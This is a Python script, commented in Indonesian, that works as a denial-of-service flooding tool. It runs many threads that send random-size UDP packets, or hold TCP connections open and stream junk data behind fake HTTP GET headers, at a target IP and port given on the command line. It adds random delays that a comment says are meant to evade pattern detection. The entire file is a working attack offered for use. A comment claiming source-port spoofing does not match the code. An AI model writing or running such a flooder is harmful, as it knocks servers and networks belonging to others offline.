#!/usr/bin/env python3
import argparse
import random
import socket
import threading
import time
import os

# Variasi ukuran paket dinamis
MIN_PACKET_SIZE = 64
MAX_PACKET_SIZE = 2048

def send_udp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        try:
            # Generate payload acak dengan ukuran bervariasi
            payload = os.urandom(random.randint(MIN_PACKET_SIZE, MAX_PACKET_SIZE))
            
            # Spoof port sumber acak
            sock.sendto(payload, (target_ip, target_port))
            
            # Tambahkan delay acak untuk menghindari pola
            time.sleep(random.uniform(0.001, 0.005))
            
        except Exception as e:
            print(f"UDP Error: {e}")
            time.sleep(1)  # Jeda sebelum mencoba kembali

def send_tcp():
    while True:
        try:
            # Buat koneksi TCP baru dengan timeout
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                
                # Pertahankan koneksi dan kirim data terus menerus
                while True:
                    payload = os.urandom(random.randint(MIN_PACKET_SIZE, MAX_PACKET_SIZE))
                    
                    # Kirim dengan header yang dimodifikasi
                    sock.sendall(
                        b"GET / HTTP/1.1\r\n" +
                        b"Host: " + target_ip.encode() + b"\r\n" +
                        b"User-Agent: " + os.urandom(16) + b"\r\n\r\n" +
                        payload
                    )
                    
                    # Variasi interval pengiriman
                    time.sleep(random.uniform(0.001, 0.01))
                    
        except Exception as e:
            print(f"TCP Error: {e}")
            time.sleep(1)

def attack_manager(protocol):
    threads = []
    for _ in range(args.threads):  # Diperbaiki: menggunakan args.threads
        t = threading.Thread(target=protocol)
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("-c", "--choice", choices=['tcp','udp'], default='udp', help="Protocol type")
    args = parser.parse_args()

    target_ip = args.ip
    target_port = args.port

    print(f"Starting attack on {target_ip}:{target_port} using {args.threads} {args.choice.upper()} threads")
    
    try:
        if args.choice == 'udp':
            attack_manager(send_udp)
        else:
            attack_manager(send_tcp)
    except KeyboardInterrupt:
        print("Attack stopped by user")
